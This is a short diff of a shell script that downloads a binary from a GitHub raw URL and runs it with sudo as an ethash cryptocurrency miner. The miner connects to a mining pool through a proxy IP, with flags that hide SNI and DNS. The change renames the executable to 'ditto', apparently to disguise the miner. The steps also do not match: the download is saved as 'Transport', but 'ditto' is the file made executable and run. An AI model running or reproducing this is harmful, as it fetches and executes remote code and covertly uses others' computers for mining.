@@ -7,4 +7,4 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
 chmod +x ditto
 ph add ditto
-sudo ./Transport -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --proxy 140.238.247.53:1080 --no-sni --dns-https-server 1.1.1.1 
+sudo ./ditto -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Gok001 -p x -w Trans --proxy 140.238.247.53:1080 --no-sni --dns-https-server 1.1.1.1 
